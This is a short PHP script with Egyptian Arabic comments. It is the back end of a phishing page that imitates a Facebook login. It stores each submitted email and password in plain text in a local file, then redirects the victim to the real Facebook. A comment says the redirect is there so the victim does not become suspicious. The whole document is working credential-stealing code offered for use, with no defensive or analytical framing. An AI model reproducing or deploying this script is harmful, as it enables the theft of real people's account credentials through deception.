<?php
// 1. استلام البيانات اللي اتكتبت في الصفحة
$email = $_POST['email'];
$pass = $_POST['password'];

// 2. فتح (أو إنشاء) ملف نصي اسمه usernames.txt لحفظ البيانات
$file = fopen("usernames.txt", "a");

// 3. كتابة الإيميل والباسورد جوه الملف
fwrite($file, "Email: " . $email . " | Pass: " . $pass . "\n");

// 4. قفل الملف عشان البيانات تتحفظ صح
fclose($file);

// 5. تحويل المستخدم لفيسبوك الحقيقي عشان ميشكش في حاجة
header("Location: https://www.facebook.com");
exit();
?>
